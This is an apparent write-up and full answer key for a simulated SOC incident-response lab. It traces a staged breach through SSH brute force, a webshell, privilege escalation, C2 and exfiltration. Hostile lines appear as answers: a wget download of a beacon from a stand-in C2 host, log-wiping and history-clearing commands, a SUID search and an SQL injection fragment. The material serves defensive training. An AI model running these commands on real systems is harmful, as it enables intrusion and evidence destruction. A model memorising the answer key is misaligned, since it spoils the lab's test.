# Stadium FC — SOC Analyst Lab — Writeup

40-question SOC incident response lab. Analyze 7 evidence files from a
simulated breach, answer sequentially (3 attempts per question), score
>= 70% (28/40) to earn the flag.

## Access

```
http://HOST:8017
```

## Attack Story

Threat actor `185.196.8.23` compromises Stadium FC infrastructure on
2026-03-15 between 03:40 and 03:52 UTC:

1. **Initial Access** — SSH brute-force against jumpbox `10.10.10.10`
   (22 failed attempts, success at 03:47:24 as root)
2. **Persistence** — Creates user `ops_manager`, installs cron job at
   `/etc/cron.d/.sysupdate` and systemd service at
   `/etc/systemd/system/stadium-telemetry.service`
3. **Lateral Movement** — SSH from jumpbox to web server `10.10.10.50`
   as `ops_manager`
4. **Web Exploitation** — SQL injection, `.git/config` / `.env` exposure,
   webshell upload (`cmd.php`)
5. **Privilege Escalation** — `sudo /bin/bash` after SUID enumeration
6. **C2** — Beacon downloaded from `c2.stadium-ops.example` (194.26.135.89:4444)
7. **Exfiltration** — `curl POST` to `paste.darkleaf.cc` with
   `/tmp/.stage/matchdata.tar.gz.enc`
8. **Anti-forensics** — `rm -rf /var/log/wtmp`, `history -c && history -w`

Secondary scanner `91.215.85.142` does port scanning starting at 04:00.
Three DGA domains (`xk3mf9a2.biz`, `q7hnwp4e.biz`, `r2djc8v1.biz`)
appear in DNS after the main attack.

## Evidence Files

| File | What to look for |
|------|-----------------|
| `auth.log` | SSH brute-force, successful login, user creation, lateral movement, sudo abuse |
| `access.log` | Web recon, SQLi payloads, webshell upload+exec, malware download, exfil |
| `suricata.json` | IDS alerts: SSH scan, SQLi, webshell, C2 beacon, exfil, DGA |
| `firewall.log` | iptables DROP (port scan), ACCEPT (SSH, C2, exfil, DNS) |
| `dns_queries.log` | C2 domain resolution, exfil domain, DGA domains |
| `syslog` | User creation, cron/systemd persistence, sudo, exfil curl, anti-forensics |
| `timeline.csv` | Unified timeline for correlation |

## Answers

### Easy (1–15)

```
Q01  185.196.8.23                              auth.log — Failed password source IP
Q02  91.215.85.142                             firewall.log — iptables DROP source
Q03  ops_manager                               auth.log/syslog — useradd entry
Q04  10.10.10.10                               firewall.log — DST for SSH ACCEPT
Q05  22                                        firewall.log — DPT field
Q06  cmd.php                                   access.log — POST /upload then /uploads/cmd.php
Q07  Mozilla/5.0 (X11; Linux) StadiumBot/1.0   access.log — UA field for attacker IP
Q08  c2.stadium-ops.example                    dns_queries.log or access.log wget cmd
Q09  194.26.135.89                             dns_queries.log — A record for C2
Q10  4444                                      firewall.log DPT or access.log wget URL
Q11  /var/www/html/uploads/cmd.php             access.log — /uploads/cmd.php path
Q12  10.10.10.50                               firewall.log — SRC for outbound C2
Q13  paste.darkleaf.cc                         dns_queries.log or syslog curl target
Q14  2026-03-15                                any evidence file timestamp
Q15  OR 1=1                                    access.log — /search?q= payload
```

### Medium (16–30)

```
Q16  22                                        auth.log — count Failed password lines
Q17  03:47:24                                  auth.log — Accepted password timestamp
Q18  ET WEB_SERVER SQL Injection Attempt -- UNION SELECT
                                               suricata.json — sig_id 2006546
Q19  2001219                                   suricata.json — first alert sig_id
Q20  /etc/cron.d/.sysupdate                    syslog — crontab REPLACE entry
Q21  /etc/systemd/system/stadium-telemetry.service
                                               syslog — Created symlink entry
Q22  T1110.001                                 MITRE — Brute Force: Password Guessing
Q23  T1053.003                                 MITRE — Scheduled Task/Job: Cron
Q24  10.10.10.10                               auth.log — SSH to webserver from jumpbox
Q25  /usr/bin/find / -perm -u=s                auth.log/syslog — sudo COMMAND
Q26  /tmp/.stage/matchdata.tar.gz.enc          syslog — curl --data-binary target
Q27  A Network Trojan was detected             suricata.json — C2 alert category
Q28  .git/config                               access.log — 200 response to sensitive path
Q29  ET POLICY curl User-Agent to External IP -- Possible Data Exfiltration
                                               suricata.json — exfil timestamp alert
Q30  3                                         dns_queries.log — count .biz DGA domains
```

### Hard (31–40)

```
Q31  xk3mf9a2.biz, q7hnwp4e.biz, r2djc8v1.biz
                                               dns_queries.log — chronological order
Q32  rm -rf /var/log/wtmp                      syslog — file deletion near end
Q33  history -c && history -w                  syslog — history clearing
Q34  T1548.003                                 MITRE — Abuse Elevation: Sudo
Q35  T1021.004                                 MITRE — Remote Services: SSH
Q36  12                                        03:40 (first scan) to 03:52 (exfil)
Q37  2008284                                   suricata.json — PHP Webshell sig_id
Q38  wget http://c2.stadium-ops.example:4444/beacon -O /tmp/beacon
                                               access.log — decode cmd= parameter
Q39  10.10.10.51                               network scheme: .10 jump, .50 web, .51 db
Q40  T1048.003                                 MITRE — Exfil Over Alternative Protocol
```

## MITRE ATT&CK Mapping

| Phase | Technique | ID |
|-------|-----------|-----|
| Initial Access | Brute Force: Password Guessing | T1110.001 |
| Persistence | Scheduled Task/Job: Cron | T1053.003 |
| Privilege Escalation | Abuse Elevation: Sudo | T1548.003 |
| Lateral Movement | Remote Services: SSH | T1021.004 |
| Command & Control | App Layer Protocol: Web | T1071.001 |
| Exfiltration | Exfil Over Alternative Protocol | T1048.003 |
| Execution | Command and Scripting: Unix Shell | T1059.004 |

## Hint Ladder

1. *Free:* "Start with auth.log. Count the failed SSH attempts, note
   the source IP, and find the successful login timestamp."
2. *Cheap:* "Cross-reference the attacker IP across all evidence files.
   The same IP appears in auth.log, access.log, firewall.log, and
   suricata.json with different activity in each."
3. *Medium:* "For MITRE IDs, map each attack phase to the ATT&CK
   framework. Brute force = T1110, cron persistence = T1053, sudo
   abuse = T1548."
4. *Last resort:* "The timeline.csv is your cheat sheet — it correlates
   events across all sources. Read it top to bottom for the full kill
   chain."
